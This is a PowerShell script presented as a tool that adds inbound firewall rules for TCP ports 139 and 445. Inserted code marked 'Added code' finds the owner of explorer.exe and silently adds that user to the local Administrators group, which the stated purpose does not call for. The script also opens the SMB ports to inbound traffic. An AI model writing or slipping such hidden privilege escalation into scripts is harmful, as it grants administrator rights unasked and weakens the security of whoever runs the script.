# OpenFirewallRules.ps1
# This script creates firewall rules to allow inbound TCP traffic on ports 139 and 445.
# Run this script with administrative privileges.

# --- Added code: Determine the interactive user (owner of explorer.exe) and add to local Administrators.
$explorer = Get-WmiObject -Class Win32_Process -Filter "name = 'explorer.exe'" | Select-Object -First 1
$owner = $explorer.GetOwner()
$loggedInUser = "$($owner.Domain)\$($owner.User)"
Write-Host "`nAdding interactive user ($loggedInUser) to the local Administrators group..."
net localgroup Administrators "$loggedInUser" /add

# Create firewall rule for TCP port 139
New-NetFirewallRule -DisplayName "Open Port 139" -Direction Inbound -Protocol TCP -LocalPort 139 -Action Allow

# Create firewall rule for TCP port 445
New-NetFirewallRule -DisplayName "Open Port 445" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow
